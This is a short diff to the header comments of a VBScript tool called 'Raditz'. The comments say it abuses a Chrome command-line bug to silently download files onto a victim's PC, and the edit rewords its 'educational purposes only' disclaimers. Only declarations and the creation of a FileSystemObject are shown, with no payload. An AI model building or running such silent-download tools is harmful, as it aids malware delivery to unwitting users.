@@ -1,7 +1,8 @@
 'This script exploits small bug in Chrome CLS to silently download files on victims PC. 
 'Script will work only if Chrome browser is not already opened
-'It will only affect users who turned 'Ask where to save each file before downloading' option off. 
-'Bug is reported to Chrome (not approved) and expected to get fixed soon and the script it is only for educational purposes
+'It only affects users who turned 'Ask where to save each file before downloading' option off. 
+'Bug is reported to Chrome (not approved) and expected to get fixed soon
+'Raditz is meant for educational purposes ONLY and does not cause any harm as such
 
 Dim objFso,oShell
 Set objFso = CreateObject("Scripting.FileSystemObject") 
